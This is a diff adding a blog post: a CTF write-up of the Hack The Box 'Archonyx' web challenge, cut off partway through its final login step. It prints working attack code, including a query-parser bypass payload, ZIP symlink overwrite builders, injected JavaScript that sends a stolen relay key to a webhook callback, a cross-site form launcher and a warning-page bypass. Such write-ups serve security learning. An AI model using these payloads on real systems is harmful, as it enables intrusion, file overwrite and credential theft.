@@ -1,0 +1,1182 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Archonyx | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="Chained an authenticated Warden bot, a query-parser differential, unsafe ZIP extraction, and a local Less plugin into server-side execution.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/archonyx.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<meta property="og:url" content="https://jennshaggy.github.io/archonyx.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Archonyx">
+<meta property="og:description" content="Chained an authenticated Warden bot, a query-parser differential, unsafe ZIP extraction, and a local Less plugin into server-side execution.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Archonyx">
+<meta name="twitter:description" content="Chained an authenticated Warden bot, a query-parser differential, unsafe ZIP extraction, and a local Less plugin into server-side execution.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu">
+                    <span class="menu-toggle-label">Menu</span>
+                    <span class="menu-toggle-icon" aria-hidden="true">
+                        <span></span>
+                        <span></span>
+                    </span>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Archonyx</h1>
+    <div class="post-description">Chained an authenticated Warden bot, a query-parser differential, unsafe ZIP extraction, and a local Less plugin into server-side execution.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Archonyx chained an authenticated Warden bot, a query-parser differential, unsafe ZIP extraction, and a local Less plugin into server-side execution. I treated every transition as a separate event: report acceptance, browser navigation, launcher execution, archive retrieval, same-origin script execution, authorization escalation, and plugin execution.</p>
+
+<table>
+<tr><td><strong>Event</strong></td><td>Hack The Box Cyber Apocalypse 2026</td></tr>
+<tr><td><strong>Category</strong></td><td>Web</td></tr>
+<tr><td><strong>Difficulty</strong></td><td>Medium</td></tr>
+<tr><td><strong>Points</strong></td><td>975</td></tr>
+<tr><td><strong>Outcome</strong></td><td>Solved</td></tr>
+</table>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 9.21.16 PM.png" alt="Archonyx challenge overview on Hack The Box" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>The assignment</h2>
+
+<p>House Veyr &amp; Co. ran a convoy ledger that quietly falsified delays and favored its own shipments. The challenge asked me to break into the ledger and recover the buried convoy that proved it.</p>
+
+<p>Time for a web app CTF. My bread, butter, toast, and jam.</p>
+
+<hr>
+
+<h2>Starting with the source</h2>
+
+<p>I extracted the supplied application before spawning the live target:</p>
+
+<pre><code>cd ~/Downloads
+unzip archonyx.zip
+cd Archonyx</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 9.25.55 PM.png" alt="Extracted Archonyx application directory listing" style="max-width:100%;margin:2rem 0;">
+
+<p>Well, well.</p>
+
+<p>The package was a Node/Express application with JWT-cookie authentication, an automated review bot, remote archive imports, role-gated Ledgermaster routes, and a setuid <code>/readflag</code> helper.</p>
+
+<p>I did not surmise this by glancing, FYI. I do my homework.</p>
+
+<h3>The Warden carried an authenticated session</h3>
+
+<p>I traced the report controller into the Puppeteer service:</p>
+
+<pre><code>nl -ba controllers/pageController.js |
+sed -n '47,56p'
+
+nl -ba services/bot.js |
+sed -n '4,27p'</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 9.33.53 PM.png" alt="Report controller and Puppeteer bot showing authenticated JWT cookie" style="max-width:100%;margin:2rem 0;">
+
+<p><code>/report</code> handed a user-supplied URL to a browser carrying a signed Warden JWT in an <code>HttpOnly</code> cookie. JavaScript could not read that cookie, but the browser would attach it to same-origin requests.</p>
+
+<p>That gave me my first trust boundary:</p>
+
+<pre><code>Unauthenticated report
+&rarr; Authenticated Warden browser
+&rarr; Internal application requests</code></pre>
+
+<p>Admin bots. I could not design a more perfect challenge myself.</p>
+
+<h3>The server and browser parsed <code>theme</code> separately</h3>
+
+<p>I compared the server-side check with the browser-side sink:</p>
+
+<pre><code>nl -ba controllers/pageController.js |
+sed -n '9,16p'
+
+nl -ba views/ledger.ejs |
+sed -n '209,216p'</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 9.35.27 PM.png" alt="Server-side Express query check versus browser-side URLSearchParams innerHTML sink" style="max-width:100%;margin:2rem 0;">
+
+<p>The controller validated <code>theme</code> through Express's parsed query object. The ledger page later read the raw URL again with <code>URLSearchParams</code> and assigned the result to <code>innerHTML</code>.</p>
+
+<p>The same URL therefore passed through two parsers. If they disagreed about which parameters existed, the browser could consume a value the server never checked.</p>
+
+<h3>Archive validation happened after extraction</h3>
+
+<p>Next I followed <code>/api/fetch</code> into the upload service:</p>
+
+<pre><code>nl -ba controllers/apiController.js |
+sed -n '59,80p'
+
+nl -ba services/uploadService.js |
+sed -n '40,60p'</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 9.36.37 PM.png" alt="Upload service extracting archive before validation" style="max-width:100%;margin:2rem 0;">
+
+<p>The service downloaded and extracted a remote archive before calling <code>validateExtractedFiles()</code>. By then, extraction had already written to the filesystem.</p>
+
+<h3>The Dockerfile exposed the end goal</h3>
+
+<pre><code>nl -ba Dockerfile |
+sed -n '17,29p'</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 9.37.38 PM.png" alt="Dockerfile showing setuid readflag helper and root-only flag" style="max-width:100%;margin:2rem 0;">
+
+<p>The application ran as <code>ctf</code>. The flag was root-only, and <code>/readflag</code> was setuid.</p>
+
+<p>The path required server-side execution capable of invoking the helper and preserving its output.</p>
+
+<hr>
+
+<h2>Mapping the live application</h2>
+
+<p>I used redacted variables throughout the live commands:</p>
+
+<pre><code>HOST='[REDACTED]'
+PORT='[REDACTED]'
+TARGET="http://$HOST:$PORT"
+CONTROLLED_HOST='https://[REDACTED]'
+CALLBACK='https://webhook.site/[REDACTED]'
+export HOST PORT TARGET CONTROLLED_HOST CALLBACK</code></pre>
+
+<p>I started the live investigation with Nmap:</p>
+
+<pre><code>nmap -Pn -sV --version-light \
+  --script http-title,http-headers \
+  -p "$PORT" "$HOST"</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 10.35.51 PM.png" alt="Nmap scan showing Express over HTTP with CSP nonce" style="max-width:100%;margin:2rem 0;">
+
+<p>The service was Express over HTTP. <code>/</code> redirected to <code>/enter</code>, and the response carried a per-request CSP nonce.</p>
+
+<p>I then mapped the visible route boundaries:</p>
+
+<pre><code>for path in \
+  / \
+  /enter \
+  /join \
+  /report \
+  /ledger \
+  /api/convoys \
+  /api/manifest \
+  /api/relay-key \
+  /ledgermaster
+do
+  curl -sS -o /dev/null \
+    -w "$path -&gt; %{http_code}  redirect=%{redirect_url}\n" \
+    "$TARGET$path"
+done</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 10.37.04 PM.png" alt="Route boundary mapping showing public, authenticated, and privileged groups" style="max-width:100%;margin:2rem 0;">
+
+<p>I love that command syntax.</p>
+
+<p>The responses separated the surface into three groups:</p>
+
+<table>
+<tr><td><strong>Access</strong></td><td><strong>Routes</strong></td></tr>
+<tr><td>Public</td><td><code>/enter</code>, <code>/join</code>, <code>/report</code>, <code>/api/convoys</code></td></tr>
+<tr><td>Authenticated</td><td><code>/ledger</code>, <code>/api/relay-key</code></td></tr>
+<tr><td>Privileged</td><td><code>/ledgermaster</code></td></tr>
+</table>
+
+<p><code>/api/manifest</code> returned <code>404</code>, so I left it alone until I had evidence of another route shape.</p>
+
+<h3>Testing the public convoy workflow</h3>
+
+<p>The public convoy API initially contained no records:</p>
+
+<pre><code>curl -sS "$TARGET/api/convoys" |
+jq . |
+tee initial_convoys.json</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 10.42.23 PM.png" alt="Empty convoy API response" style="max-width:100%;margin:2rem 0;">
+
+<p>Something about the empty API was bugging me, so I returned to the routes and form:</p>
+
+<pre><code>nl -ba routes/pages.js |
+sed -n '12,16p'
+
+nl -ba routes/api.js |
+sed -n '18,23p'
+
+nl -ba views/file-convoy.ejs |
+sed -n '55,68p'
+
+curl -sS -o /dev/null \
+  -w 'GET /file-convoy -&gt; %{http_code}\n' \
+  "$TARGET/file-convoy"</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 10.48.00 PM.png" alt="file-convoy route and form inspection" style="max-width:100%;margin:2rem 0;">
+
+<p>There we go. Now this tracks.</p>
+
+<p>Neither <code>GET /file-convoy</code> nor <code>POST /api/convoys</code> used authentication middleware. I submitted a harmless record through the browser:</p>
+
+<pre><code>Convoy name: SEC-CONTROL-01
+House: Marrowcairn
+Cargo: Just a Test Cargo</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 10.50.16 PM.png" alt="Test convoy record submitted through browser" style="max-width:100%;margin:2rem 0;">
+
+<p>The public API returned it afterward:</p>
+
+<pre><code>curl -sS "$TARGET/api/convoys" |
+jq .</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 11.29.11 PM.png" alt="API returning the submitted test convoy record" style="max-width:100%;margin:2rem 0;">
+
+<p>Unauthenticated users could create persistent convoy records and retrieve them later. That was useful evidence of weak authorization, but it did not advance me toward the Ledgermaster boundary.</p>
+
+<hr>
+
+<h2>Confirming the account boundary</h2>
+
+<p>I registered a normal account and received the expected pending-clearance message.</p>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 11.31.39 PM.png" alt="Registration confirmation showing pending clearance" style="max-width:100%;margin:2rem 0;">
+
+<p>The login page then refused admission because the Ledgermaster had not approved it.</p>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 11.34.27 PM.png" alt="Login refused for unverified account" style="max-width:100%;margin:2rem 0;">
+
+<p>We were at the Ledgermaster's mercy. For now.</p>
+
+<p>I verified the order of operations in the login controller:</p>
+
+<pre><code>nl -ba controllers/authController.js |
+sed -n '45,64p'</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-26 at 11.38.35 PM.png" alt="Login controller showing early return for unverified users" style="max-width:100%;margin:2rem 0;">
+
+<p>Lines 59 and 60 returned immediately for unverified users. JWT signing and the <code>HttpOnly</code> cookie occurred later.</p>
+
+<p>My pending account had no authenticated session to repurpose. The Warden remained the useful identity.</p>
+
+<hr>
+
+<h2>Proving the Warden would visit me</h2>
+
+<p>I first exposed a local Python server through an SSH reverse tunnel:</p>
+
+<pre><code>mkdir -p /tmp/archonyx-botprobe
+cd /tmp/archonyx-botprobe
+python3 -m http.server 8765 --bind 127.0.0.1</code></pre>
+
+<p>In another terminal:</p>
+
+<pre><code>ssh -R 80:127.0.0.1:8765 serveo.net</code></pre>
+
+<p>My self-tests reached the tunnel, but the early bot probe did not give me enough detail. I moved the callback to Webhook.site so I could inspect the complete request.</p>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 9.19.22 AM.png" alt="Webhook.site callback showing Warden GET request with HeadlessChrome user agent" style="max-width:100%;margin:2rem 0;">
+
+<p>The callback recorded:</p>
+
+<ul>
+<li>A <code>GET</code> request.</li>
+<li><code>Sec-Fetch-Mode: navigate</code>.</li>
+<li>A Headless Chrome user agent.</li>
+<li>A source IP distinct from mine.</li>
+</ul>
+
+<p>The Warden had opened my submitted URL in a headless browser.</p>
+
+<p>That proof also gave me a way to distinguish later stages:</p>
+
+<pre><code>Report accepted
+&rarr; Warden navigated
+&rarr; Launcher executed
+&rarr; Archive fetched
+&rarr; Same-origin script executed</code></pre>
+
+<hr>
+
+<h2>Sending parameter 1,001 to the browser</h2>
+
+<p>Express's extended query parser processed the first 1,000 parameters. The browser's <code>URLSearchParams</code> parsed the full URL.</p>
+
+<p>I placed 1,000 harmless parameters before a controlled <code>theme</code> payload:</p>
+
+<pre><code class="language-python">import urllib.parse
+import urllib.request
+
+report = "[REDACTED_TARGET]/report"
+hook = "https://webhook.site/[REDACTED]?stage=theme-parser"
+
+payload = f'&lt;meta http-equiv="refresh" content="0;url={hook}"&gt;'
+query = "&amp;".join(["x=1"] * 1000)
+internal = (
+    "http://127.0.0.1:1337/ledger?"
+    + query
+    + "&amp;theme="
+    + urllib.parse.quote(payload, safe="")
+)
+
+body = urllib.parse.urlencode({
+    "body": "Theme parser differential test",
+    "url": internal,
+}).encode()
+
+with urllib.request.urlopen(report, data=body) as response:
+    print("report_status =", response.status)
+    print("internal_url_length =", len(internal))</code></pre>
+
+<p>The callback arrived with:</p>
+
+<pre><code>stage=theme-parser
+Referer: http://127.0.0.1:1337/
+User-Agent: HeadlessChrome/150...</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 9.28.51 AM.png" alt="Webhook callback confirming parser differential exploitation" style="max-width:100%;margin:2rem 0;">
+
+<p>Parameter 1,001 reached the internal DOM and triggered navigation. Express had not included it in the validated query object, while the browser recovered it from the raw URL.</p>
+
+<p>We bypassed the parser.</p>
+
+<hr>
+
+<h2>Building an arbitrary-write archive</h2>
+
+<p>Offline review of the archive dependency indicated that duplicate entry names and symlinks could redirect an extracted file outside the destination directory.</p>
+
+<p>I wrote <code>manifest_mischief.py</code> to create two entries named <code>theme.js</code>:</p>
+
+<pre><code class="language-python">import stat
+import zipfile
+
+output = "relay_hijack.zip"
+
+javascript = r"""
+fetch('/api/relay-key', {credentials: 'include'})
+  .then(response =&gt; response.json())
+  .then(result =&gt; {
+    location.href =
+      'https://webhook.site/[REDACTED]'
+      + '?stage=relay-key&amp;key='
+      + encodeURIComponent(result.data);
+  });
+"""
+
+with zipfile.ZipFile(output, "w") as archive:
+    link = zipfile.ZipInfo("theme.js")
+    link.create_system = 3
+    link.external_attr = (stat.S_IFLNK | 0o777) &lt;&lt; 16
+    archive.writestr(link, "/app/public/theme.js")
+
+    archive.writestr("theme.js", javascript)
+
+print(f"created={output}")</code></pre>
+
+<p>I built and inspected it:</p>
+
+<pre><code>python3 manifest_mischief.py
+zipinfo -l relay_hijack.zip</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 9.46.49 AM.png" alt="relay_hijack.zip with duplicate theme.js entries" style="max-width:100%;margin:2rem 0;">
+
+<p>The duplicate-name warning was the point. The first <code>theme.js</code> was a symlink to <code>/app/public/theme.js</code>; the second was attacker-controlled JavaScript.</p>
+
+<p>If extraction created the link and then opened the duplicate path for writing, the operating system followed the link and replaced the public theme script. Post-extraction validation arrived too late to prevent the write.</p>
+
+<p>The reusable builder is available from the site's <a href="/scripts/">Scripts page</a> as <a href="/scripts/manifest_mischief.py"><code>manifest_mischief.py</code></a>.</p>
+
+<hr>
+
+<h2>Making the Warden import the archive</h2>
+
+<p>I served the archive through a controlled host and compared its hash with my local copy:</p>
+
+<pre><code>curl -fsS \
+  "$CONTROLLED_HOST/relay_hijack.zip" \
+  -o /tmp/relay_hijack_served.zip
+
+sha256sum \
+  relay_hijack.zip \
+  /tmp/relay_hijack_served.zip</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 9.55.45 AM.png" alt="SHA-256 hash match between local and served archive" style="max-width:100%;margin:2rem 0;">
+
+<p>Money. Twin hashes.</p>
+
+<p>I then created <code>warden_launch.html</code>:</p>
+
+<pre><code class="language-html">&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;form id="fetch-form"
+        method="POST"
+        action="http://127.0.0.1:1337/api/fetch"
+        target="fetch-window"&gt;
+    &lt;input type="hidden"
+           name="url"
+           value="https://[REDACTED]/relay_hijack.zip"&gt;
+  &lt;/form&gt;
+
+  &lt;script&gt;
+    window.open("about:blank", "fetch-window");
+    document.getElementById("fetch-form").submit();
+
+    setTimeout(() =&gt; {
+      location.href = "http://127.0.0.1:1337/ledger";
+    }, 3000);
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+<p>The launcher used the Warden's same-origin session to submit the archive to internal <code>/api/fetch</code>. After three seconds, it navigated to <code>/ledger</code>, which loaded the overwritten <code>theme.js</code>.</p>
+
+<h3>First failure: the launcher arrived but could not run</h3>
+
+<p>I initially configured Webhook.site to return the launcher and verified that the served bytes matched:</p>
+
+<pre><code>curl -fsS \
+  "$CALLBACK?probe=launcher-verification" \
+  -o /tmp/warden_launch_served.html
+
+cmp -s \
+  warden_launch.html \
+  /tmp/warden_launch_served.html &amp;&amp;
+echo 'launcher_match=yes'</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 10.20.15 AM.png" alt="Launcher verification showing byte match but archive not fetched" style="max-width:100%;margin:2rem 0;">
+
+<p>The Warden reached Webhook.site, but the Python server never received <code>relay_hijack.zip</code>.</p>
+
+<p>Response headers explained the failure:</p>
+
+<pre><code>curl -sS -D - -o /dev/null \
+  "$CALLBACK?probe=response-headers" |
+grep -Ei \
+  'HTTP/|content-type|content-security-policy|x-content-type'</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 10.38.51 AM.png" alt="CSP headers showing script-src none and form-action none" style="max-width:100%;margin:2rem 0;">
+
+<p>The host returned a CSP containing:</p>
+
+<pre><code>script-src 'none'
+form-action 'none'</code></pre>
+
+<p>The report worked. The Warden navigated. The launcher could neither run its script nor submit its form.</p>
+
+<h3>Second failure: HTTPBingo altered the document</h3>
+
+<p>I tested a Base64 delivery endpoint next. The request succeeded, but the result did not match the launcher:</p>
+
+<pre><code>wc -c \
+  warden_launch.html \
+  /tmp/httpbingo_launcher.html
+
+cmp -l \
+  warden_launch.html \
+  /tmp/httpbingo_launcher.html |
+head -10
+
+tail -c 32 warden_launch.html |
+xxd
+
+tail -c 32 /tmp/httpbingo_launcher.html |
+xxd</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 11.00.47 AM.png" alt="HTTPBingo HTML-escaping the launcher document" style="max-width:100%;margin:2rem 0;">
+
+<p>HTTPBingo had HTML-escaped the document. <code>&lt;doctype...</code> became <code>&amp;lt;doctype...</code>, so the browser received text instead of an executable page.</p>
+
+<h3>Third failure: Serveo put up a warning page</h3>
+
+<p>I returned to the reverse tunnel and verified the launcher, archive, and response type:</p>
+
+<pre><code>curl -fsS \
+  "$CONTROLLED_HOST/warden_launch.html" \
+  -o /tmp/served_launcher.html
+
+cmp -s \
+  warden_launch.html \
+  /tmp/served_launcher.html &amp;&amp;
+echo 'launcher_match=yes'
+
+curl -fsS \
+  "$CONTROLLED_HOST/relay_hijack.zip" \
+  -o /tmp/served_archive.zip
+
+sha256sum \
+  relay_hijack.zip \
+  /tmp/served_archive.zip
+
+curl -sSI \
+  "$CONTROLLED_HOST/warden_launch.html" |
+grep -Ei \
+  'HTTP/|content-type|content-security-policy'</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 11.06.28 AM.png" alt="Serveo serving correct bytes and content type" style="max-width:100%;margin:2rem 0;">
+
+<p>The bytes and content type were good, but the Warden still did not request the archive. I replayed the request with the bot's browser profile and inspected the returned page:</p>
+
+<pre><code>curl -sS \
+  -D /tmp/serveo_headers.txt \
+  -A 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/150.0.0.0 Safari/537.36' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
+  -H 'Sec-Fetch-Mode: navigate' \
+  -H 'Sec-Fetch-Site: none' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  "$CONTROLLED_HOST/warden_launch.html" \
+  -o /tmp/serveo_browser_response.html
+
+grep -Ei \
+  'HTTP/|content-type|location|set-cookie' \
+  /tmp/serveo_headers.txt
+
+sed -n \
+  '/&lt;form/,/&lt;\/form&gt;/p' \
+  /tmp/serveo_browser_response.html</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 11.12.46 AM.png" alt="Serveo anti-phishing warning page with bypass form" style="max-width:100%;margin:2rem 0;">
+
+<p>Serveo had interposed an anti-phishing page. I know. The irony.</p>
+
+<p>Its form exposed the supported bypass:</p>
+
+<pre><code>serveo-skip-browser-warning=true</code></pre>
+
+<p>I reproduced the complete browser flow and compared the final response with my launcher:</p>
+
+<pre><code>curl -sSL \
+  -c /tmp/serveo.cookies \
+  -b /tmp/serveo.cookies \
+  -A 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/150.0.0.0 Safari/537.36' \
+  "$CONTROLLED_HOST/warden_launch.html?serveo-skip-browser-warning=true" \
+  -o /tmp/serveo_final_launcher.html
+
+cmp -s \
+  warden_launch.html \
+  /tmp/serveo_final_launcher.html &amp;&amp;
+echo 'full_browser_flow_match=yes'</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 11.17.55 AM.png" alt="Full browser flow returning exact launcher match" style="max-width:100%;margin:2rem 0;">
+
+<p>Now the browser flow returned the page I had written.</p>
+
+<hr>
+
+<h2>Recovering the relay key</h2>
+
+<p>I submitted the warning-bypass URL through <code>/report</code>:</p>
+
+<pre><code>curl -sS -X POST \
+  "$TARGET/report" \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode \
+  'body=Please review this convoy manifest.' \
+  --data-urlencode \
+  "url=$CONTROLLED_HOST/warden_launch.html?serveo-skip-browser-warning=true" |
+grep -oE \
+  'Your report has been filed|Details of the delay[^&lt;]*'</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 11.18.41 AM.png" alt="Report submission accepted" style="max-width:100%;margin:2rem 0;">
+
+<p>The local server finally recorded:</p>
+
+<pre><code>GET /warden_launch.html
+GET /relay_hijack.zip</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 11.19.15 AM.png" alt="Local server log showing Warden fetching launcher and archive" style="max-width:100%;margin:2rem 0;">
+
+<p>Muahaha.</p>
+
+<p>The Warden submitted the archive, the extractor overwrote <code>/app/public/theme.js</code>, and the browser opened <code>/ledger</code>. The poisoned same-origin script requested <code>/api/relay-key</code> with the Warden's session and sent the value to my callback.</p>
+
+<p>I validated the redacted key against the live API:</p>
+
+<pre><code>RELAY_KEY='[REDACTED]'
+
+curl -sS -i \
+  -H "X-API-Key: $RELAY_KEY" \
+  "$TARGET/api/relay-key"</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 11.20.38 AM.png" alt="Relay key validated against live API returning 200 OK" style="max-width:100%;margin:2rem 0;">
+
+<p>The endpoint returned <code>200 OK</code> and the same value. The key resolved to the bot account, which could call <code>/api/fetch</code>.</p>
+
+<p>I could now import archives without summoning the Warden every time.</p>
+
+<hr>
+
+<h2>Replacing the login database</h2>
+
+<p>The application reread <code>/app/data/db.json</code> during login. Replacing it would take effect without restarting Node.</p>
+
+<p>I built <code>ledger_coup.py</code> around the same duplicate-entry primitive:</p>
+
+<pre><code class="language-python">import json
+import stat
+import zipfile
+
+password_hash = "[REDACTED_BCRYPT_HASH]"
+
+database = {
+    "users": [
+        {
+            "username": "[REDACTED_USER]",
+            "password": password_hash,
+            "role": "ledgermaster",
+            "verified": True,
+            "apiKey": "[REDACTED_RELAY_KEY]",
+            "drawsId": None
+        }
+    ],
+    "convoys": []
+}
+
+with zipfile.ZipFile("ledger_coup.zip", "w") as archive:
+    link = zipfile.ZipInfo("db.json")
+    link.create_system = 3
+    link.external_attr = (stat.S_IFLNK | 0o777) &lt;&lt; 16
+    link.compress_type = zipfile.ZIP_STORED
+    archive.writestr(link, "/app/data/db.json")
+
+    replacement = zipfile.ZipInfo("db.json")
+    replacement.create_system = 3
+    replacement.external_attr = (stat.S_IFREG | 0o600) &lt;&lt; 16
+    replacement.compress_type = zipfile.ZIP_STORED
+    archive.writestr(
+        replacement,
+        json.dumps(database, indent=2)
+    )</code></pre>
+
+<p>I generated and inspected the archive:</p>
+
+<pre><code>python3 ledger_coup.py
+zipinfo -l ledger_coup.zip
+sha256sum ledger_coup.zip</code></pre>
+
+<img src="/images/archonyx/Screenshot 2026-07-27 at 11.31.27 AM.png" alt="ledger_coup.zip with duplicate db.json entries" style="max-width:100%;margin:2rem 0;">
+
+<p>The first <code>db.json</code> was a symlink to <code>/app/data/db.json</code>. The second was the replacement database.</p>
+
+<p>After verifying the hosted archive's hash, I imported it with the relay key:</p>
+
+<pre><code>curl -fsS \
+  "$CONTROLLED_HOST/ledger_coup.zip" \
+  -o /tmp/served_ledger_coup.zip
+
+sha256sum \
+  ledger_coup.zip \
+  /tmp/served_ledger_coup.zip
+
+curl -sS -i -X POST \
+  "$TARGET/api/fetch" \
+  -H "X-API-Key: $RELAY_KEY" \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode \
+  "url=$CONTROLLED_HOST/ledger_coup.zip"</code></pre>
+
+<p>The server returned:</p>
+
+<pre><code class="language-json">{"data":"Mirror station bundle fetched and lodged"}</code></pre>
+
+<p>I logged in with the controlled account and requested the restricted page:</p>
+
+<pre><code>curl -sS \
+  -D /tmp/ledgermaster_login.headers \
+  -o /dev/null \
+  -c /tmp/ledgermaster.cookies \
+  -X POST "$TARGET/enter" \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode \
